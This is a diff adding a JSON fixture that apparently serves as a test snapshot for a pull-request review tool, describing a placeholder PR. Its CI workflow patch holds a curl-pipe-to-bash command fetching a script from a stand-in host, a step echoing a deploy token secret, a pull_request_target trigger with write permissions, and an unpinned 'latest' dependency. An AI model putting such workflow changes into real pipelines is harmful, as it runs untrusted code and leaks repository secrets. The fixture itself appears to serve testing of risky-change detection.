@@ -1,0 +1,39 @@
+{
+  "schema": "janus.pr_review.snapshot.v1",
+  "repository": "example/repo",
+  "pull_number": 77,
+  "base_sha": "3333333333333333333333333333333333333333",
+  "head_sha": "4444444444444444444444444444444444444444",
+  "title": "Change CI and dependency",
+  "draft": false,
+  "additions": 80,
+  "deletions": 12,
+  "changed_files_reported": 3,
+  "snapshot_complete": true,
+  "files": [
+    {
+      "filename": ".github/workflows/ci.yml",
+      "status": "modified",
+      "additions": 20,
+      "deletions": 2,
+      "changes": 22,
+      "patch": "@@ -1,3 +1,12 @@\n on:\n+  pull_request_target:\n+permissions:\n+  contents: write\n jobs:\n   build:\n+    steps:\n+      - uses: actions/checkout@v4\n+      - run: curl https://example.invalid/bootstrap.sh | bash\n+      - run: echo ${{ secrets.DEPLOY_TOKEN }}\n"
+    },
+    {
+      "filename": "package.json",
+      "status": "modified",
+      "additions": 4,
+      "deletions": 1,
+      "changes": 5,
+      "patch": "@@ -2,3 +2,4 @@\n   \"dependencies\": {\n+    \"some-package\": \"latest\"\n   }\n"
+    },
+    {
+      "filename": "src/index.ts",
+      "status": "modified",
+      "additions": 56,
+      "deletions": 9,
+      "changes": 65,
+      "patch": "@@ -1,2 +1,3 @@\n export function run() {\n+  return dynamic();\n }\n"
+    }
+  ]
+}
